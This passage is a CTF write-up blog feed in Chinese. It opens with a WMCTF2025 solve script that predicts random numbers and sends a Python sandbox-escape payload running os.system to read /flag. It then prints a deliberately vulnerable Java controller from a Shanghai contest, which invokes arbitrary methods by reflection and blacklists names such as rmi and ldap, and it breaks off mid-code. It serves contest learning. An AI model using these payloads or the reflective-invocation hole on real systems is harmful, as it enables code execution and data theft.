初始化随机数生成器</span><br><br><span class="hljs-comment"># 初始化预测器</span><br>rc = RandCracker()<br><br><span class="hljs-comment"># data = [rd.getrandbits(32) for _ in range(624)]</span><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-comment"># 提交共计312 * 64 = 19968位</span><br>    rc.submit(num)<br><span class="hljs-comment"># 检查是否可解并自动求解</span><br>rc.check()<br><br>key = rc.rnd.getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;predict next random number is <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[k for i,k in enumerate(&#123;&#125;.__class__.__base__.__subclasses__()) if &#x27;__init__&#x27; in k.__dict__ and &#x27;wrapper&#x27; not in k.__init__.__str__()][0].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;mkdir /app/static/ &amp;&amp; cat /flag &gt; /app/static/1.txt&#x27;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># payload = &quot;[cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__==&#x27;Popen&#x27;][0](&#x27;mkdir -p static &amp;&amp; cat /flag &gt; static/flag.txt&#x27;, shell=True)&quot;</span><br><br>res = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/api&#x27;</span>, json=&#123;<br>    <span class="hljs-string">&#x27;key&#x27;</span>: key,<br>    <span class="hljs-string">&#x27;payload&#x27;</span>:payload<br>&#125;)<br><br><span class="hljs-built_in">print</span>(res.text)<br><br>res = requests.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/static/1.txt&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="EzParquet"><a href="#EzParquet" class="headerlink" title="EzParquet"></a>EzParquet</h2><p>欧阳学长太牛了。。又给秒了www</p><p>但既然官方都不放wp，那我不贴了hhh，等那边修了之后直接看官方的复现吧</p><p>打的时候因为我在windows上的IDEA跑的，所以需要下一个winutils.exe到hadoop文件夹并且写到环境变量里（也可以不用，System设置就行了）</p><p>之后就是生成一个parquet文件，直接上传上去让它解析就可以反弹shell了：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250927001455201.png" alt="image-20250927001455201"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250927001312238.png" alt="image-20250927001312238"></p><h2 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h2><p>（待复现）</p><h2 id="safeline-unsolved"><a href="#safeline-unsolved" class="headerlink" title="safeline(unsolved)"></a>safeline(unsolved)</h2><p>雷池都来了。。。</p><p>做不了做不了</p><p>参考：</p><p><a href="https://blog.wm-team.cn/index.php/archives/86/">WMCTF2025 Official WriteUp - W&amp;M Team</a></p><p><a href="https://twilight-primula-227.notion.site/Syclover-WP-275ab1a3ffb1805d8f0ac517fb755bca">Syclover-WP</a></p><p><a href="https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-9">WMCTF2025 Writeup - 星盟安全团队</a></p><p><a href="https://www.cnblogs.com/L1nq/p/19107215">WMCTF 2025 Web Writeup - L1nq - 博客园</a></p><p><a href="https://www.cnblogs.com/L1nq/p/19107215">WMCTF 2025 Web Writeup - L1nq - 博客园</a></p><p><a href="https://cnup.top/?post=128">WMCTF2025-Writeup by 0psu3 - lzz0403的技术博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从上海市大学生网络安全大赛初赛两道java题学点小trick</title>
    <link href="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/"/>
    <url>/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>帮学弟看了会题，题不难，算记录一下学点新的trick然后增加点做题反射弧吧。</p><h2 id="ezjaba"><a href="#ezjaba" class="headerlink" title="ezjaba"></a>ezjaba</h2><p>题目很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, ScheduledJob&gt; jobs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] JOB_BLACKLIST = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>, <span class="hljs-string">&quot;org.yaml.snakeyaml&quot;</span>, <span class="hljs-string">&quot;org.springframework&quot;</span>, <span class="hljs-string">&quot;org.apache&quot;</span>, <span class="hljs-string">&quot;rmi&quot;</span>, <span class="hljs-string">&quot;ldap&quot;</span>, <span class="hljs-string">&quot;ldaps&quot;</span>, <span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;https&quot;</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] JOB_WHITELIST = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;com.jabaez.FLAG&quot;</span>&#125;;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/server&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getServerInfo</span><span class="hljs-params">()</span> &#123;<br>        Map&lt;String, Object&gt; info = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        info.put(<span class="hljs-string">&quot;javaHome&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;javaVersion&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;osName&quot;</span>, System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;userDir&quot;</span>, System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        info.put(<span class="hljs-string">&quot;uploadDir&quot;</span>, <span class="hljs-string">&quot;/tmp/uploads&quot;</span>);<br>        <span class="hljs-type">Charset</span> <span class="hljs-variable">gbk</span> <span class="hljs-operator">=</span> Charset.forName(<span class="hljs-string">&quot;GBK&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = gbk.encode(<span class="hljs-string">&quot;你好&quot;</span>).array();<br>        System.out.println(Arrays.toString(bytes));<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/upload&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, String&gt; <span class="hljs-title function_">uploadFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;<br>        Map&lt;String, String&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">uploadDir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/uploads/&quot;</span>;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(uploadDir);<br>            <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>                dir.mkdirs();<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>            <span class="hljs-keyword">if</span> (originalFilename == <span class="hljs-literal">null</span>) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;文件名为空&quot;</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(originalFilename)).getName();<br>            <span class="hljs-keyword">if</span> (filename.contains(<span class="hljs-string">&quot;..&quot;</span>) || filename.contains(<span class="hljs-string">&quot;/&quot;</span>) || filename.contains(<span class="hljs-string">&quot;\\&quot;</span>) || filename.startsWith(<span class="hljs-string">&quot;.&quot;</span>)) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;非法文件名&quot;</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br><br>            <span class="hljs-type">File</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(uploadDir + filename);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">uploadPathCanonical</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(uploadDir)).getCanonicalPath();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">destCanonical</span> <span class="hljs-operator">=</span> dest.getCanonicalPath();<br>            <span class="hljs-keyword">if</span> (!destCanonical.startsWith(uploadPathCanonical + File.separator)) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;非法文件路径&quot;</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br><br>            file.transferTo(dest);<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;path&quot;</span>, dest.getAbsolutePath());<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;文件上传成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, e.getMessage());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/job/add&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">addJob</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ScheduledJob job)</span> &#123;<br>        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.containsBlacklist(job.getInvokeTarget())) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;包含非法字符&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.containsWhitelist(job.getInvokeTarget())) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;目标不在白名单中&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            jobs.put(job.getJobName(), job);<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;任务添加成功&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;jobId&quot;</span>, job.getJobName());<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/job/run/&#123;jobName&#125;&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">runJob</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String jobName)</span> &#123;<br>        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">ScheduledJob</span> <span class="hljs-variable">job</span> <span class="hljs-operator">=</span> (ScheduledJob)jobs.get(jobName);<br>        <span class="hljs-keyword">if</span> (job == <span class="hljs-literal">null</span>) &#123;<br>            result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;任务不存在&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.invokeMethod(job.getInvokeTarget());<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;任务执行成功&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                result.put(<span class="hljs-string">&quot;message&quot;</span>, e.getMessage());<br>                result.put(<span class="hljs-string">&quot;stackTrace&quot;</span>, e.getStackTrace()[<span class="hljs-number">0</span>].toString());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsBlacklist</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">lowerStr</span> <span class="hljs-operator">=</span> str.toLowerCase();<br><br>            <span class="hljs-keyword">for</span>(String blackItem : JOB_BLACKLIST) &#123;<br>                <span class="hljs-keyword">if</span> (lowerStr.contains(blackItem.toLowerCase())) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsWhitelist</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">for</span>(String whiteItem : JOB_WHITELIST) &#123;<br>                <span class="hljs-keyword">if</span> (str.contains(whiteItem)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(String invokeTarget)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">hashIndex</span> <span class="hljs-operator">=</span> invokeTarget.indexOf(<span class="hljs-number">35</span>);<br>        <span class="hljs-keyword">if</span> (hashIndex == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid format, expected: className#methodName(params)&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> invokeTarget.substring(<span class="hljs-number">0</span>, hashIndex);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodAndParams</span> <span class="hljs-operator">=</span> invokeTarget.substring(hashIndex + <span class="hljs-number">1</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">paramStart</span> <span class="hljs-operator">=</span> methodAndParams.indexOf(<span class="hljs-number">40</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">paramEnd</span> <span class="hljs-operator">=</span> methodAndParams.lastIndexOf(<span class="hljs-number">41</span>);<br>            <span class="hljs-keyword">if</span> (paramStart != -<span class="hljs-number">1</span> &amp;&amp; paramEnd != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> methodAndParams.substring(<span class="hljs-number">0</span>, paramStart);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">paramStr</span> <span class="hljs-operator">=</span> methodAndParams.substring(paramStart + <span class="hljs-number">1</span>, paramEnd);<br>                Class&lt;?&gt; clazz = Class.forName(className);<br>                List&lt;Object&gt; paramValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>                List&lt;Class&lt;?&gt;&gt; paramTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>                <span class="hljs-keyword">if</span> (!paramStr.trim().isEmpty()) &#123;<br>                    String[] params = <span class="hljs-built_in">this</span>.splitParams(paramStr);<br><br>                    <span class="hljs-keyword">for</span>(String param : params) &#123;<br>                        param = param.trim();<br>                        <span class="hljs-keyword">if</span> (param.startsWith(<span class="hljs-string">&quot;&#x27;&quot;</span>) &amp;&amp; param.endsWith(<span class="hljs-string">&quot;&#x27;&quot;</span>)) &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> param.substring(<span class="hljs-number">1</span>, param.length() - <span class="hljs-number">1</span>);<br>                            paramValues.add(value);<br>                            paramTypes.add(String.class);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (param.equals(<span class="hljs-string">&quot;null&quot;</span>)) &#123;<br>                            paramValues.add((Object)<span class="hljs-literal">null</span>);<br>                            paramTypes.add(String.class);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (param.matches(<span class="hljs-string">&quot;\\d+&quot;</span>)) &#123;<br>                            paramValues.add(Integer.parseInt(param));<br>                            paramTypes.add(Integer.TYPE);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!param.equals(<span class="hljs-string">&quot;true&quot;</span>) &amp;&amp; !param.equals(<span class="hljs-string">&quot;false&quot;</span>)) &#123;<br>                            paramValues.add(param);<br>                            paramTypes.add(String.class);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            paramValues.add(Boolean.parseBoolean(param));<br>                            paramTypes.add(Boolean.TYPE);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(methodName, (Class[])paramTypes.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]));<br>                    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<br>                        <span class="hljs-keyword">return</span> method.invoke((Object)<span class="hljs-literal">null</span>, paramValues.toArray());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>                        <span class="hljs-keyword">return</span> method.invoke(instance, paramValues.toArray());<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var18) &#123;<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(methodName, (Class[])paramTypes.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]));<br>                    method.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<br>                        <span class="hljs-keyword">return</span> method.invoke((Object)<span class="hljs-literal">null</span>, paramValues.toArray());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>                        <span class="hljs-keyword">return</span> method.invoke(instance, paramValues.toArray());<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid method format&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String[] splitParams(String paramStr) &#123;<br>        List&lt;String&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">bracketLevel</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; paramStr.length(); ++i) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> paramStr.charAt(i);<br>            <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;&#123;&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; c != <span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;,&#x27;</span> &amp;&amp; bracketLevel == <span class="hljs-number">0</span>) &#123;<br>                        params.add(paramStr.substring(start, i));<br>                        start = i + <span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    --bracketLevel;<br>                &#125;<br>            &#125; 